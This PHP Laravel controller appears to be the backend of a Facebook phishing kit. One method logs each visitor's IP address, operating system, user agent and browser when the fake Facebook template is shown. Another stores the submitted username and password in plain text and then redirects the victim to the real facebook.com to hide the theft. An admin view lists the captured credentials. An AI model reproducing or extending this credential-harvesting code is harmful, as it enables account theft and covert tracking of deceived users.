<?php

namespace App\Http\Controllers\Admin\Templates;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use App\Models\LogUser;
use App\Models\Facebook;

use App\Http\Controllers\Admin\GetDataUserController;
use Carbon\Carbon;


class FacebookController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        $data           = LogUser::get();        
        $credentials    = Facebook::get();  
        // dd($credentials); 
        return view('admin.dashboard.facebook.index', compact('data', 'credentials'));
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        $data = new Facebook();

        // Current time in your default timezone
        $now = Carbon::now();

        // Convert to the desired timezone before saving
        $nowInNewTimezone = $now->setTimezone('America/Caracas');

        $data->ip = $request->input('ip');
        $data->type = $request->input('type');
        $data->os = $request->input('os');
        $data->useragent = $request->input('useragent');
        $data->browser = $request->input('browser');
        $data->created_at = $nowInNewTimezone;
        

        $data->username = $request->input('username');
        $data->password = $request->input('password');

        // dd($request->all());
        $data->save();

        return redirect('https://www.facebook.com');
    }

    /**
     * Display the specified resource.
     */
    // public function show(string $id)
    public function show()
    {

        // Current time in your default timezone
        $now = Carbon::now();

        // Convert to the desired timezone before saving
        $nowInNewTimezone = $now->setTimezone('America/Caracas');   

        $ip = GetDataUserController::getClientIp();
        $type = GetDataUserController::get_ip_type();
        $os = GetDataUserController::getUserOS();
        $useragent = GetDataUserController::getUserAgent();
        $browser = GetDataUserController::getUserBrowser();

        LogUser::create([
            'template'      => 'Facebook',
            'ip'            => $ip,
            'type'          => $type,
            'os'            => $os,
            'useragent'     => $useragent,
            'browser'       => $browser,
            'created_at'    => $nowInNewTimezone,
        ]);
        
        return view('templates.facebook.index', compact('ip', 'type', 'os', 'useragent', 'browser', 'nowInNewTimezone'));
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id)
    {
        //
    }
}
